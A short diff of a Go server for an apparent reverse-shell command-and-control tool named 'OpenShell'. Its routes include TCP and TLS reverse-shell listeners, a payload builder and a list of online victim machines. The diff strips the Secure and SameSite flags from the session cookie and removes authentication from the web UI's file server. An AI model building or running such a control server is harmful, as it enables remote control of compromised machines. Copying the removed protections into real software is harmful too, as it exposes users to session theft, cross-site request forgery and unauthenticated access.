@@ -103,8 +103,6 @@ func loginHandler(w http.ResponseWriter,r *http.Request){
             Value: token,
             Path: "/",
             HttpOnly: true,
-            Secure: true,
-            SameSite: http.SameSiteStrictMode,
         })
 
         w.WriteHeader(200)
@@ -233,7 +231,7 @@ func main(){
     go StartReverseShell(strconv.Itoa(*port_tcp))  //Normal TCP
     go StartTLSReverseShell(strconv.Itoa(*port_tls))       //TLS
 
-    http.HandleFunc("/api/login",loginHandler)        //Login authentication
+    http.HandleFunc("/api/login", loginHandler)        //Login authentication
 
     http.HandleFunc("/api/builder", requireAuth(builderHandler))    //Payload builder
     http.HandleFunc("/api/stats", requireAuth(statsHandler))        //Show online machines
@@ -241,9 +239,7 @@ func main(){
     http.HandleFunc("/ws/session", requireAuth(attachHandler))      //Buffer handler
 
     fs := http.FileServer(http.Dir("../web"))
-    http.Handle("/", requireAuth(func(w http.ResponseWriter, r *http.Request) {
-        fs.ServeHTTP(w, r)
-    }))
+    http.Handle("/", fs)
 
     logger.Success("OpenShell server running on: %d", *port)
 
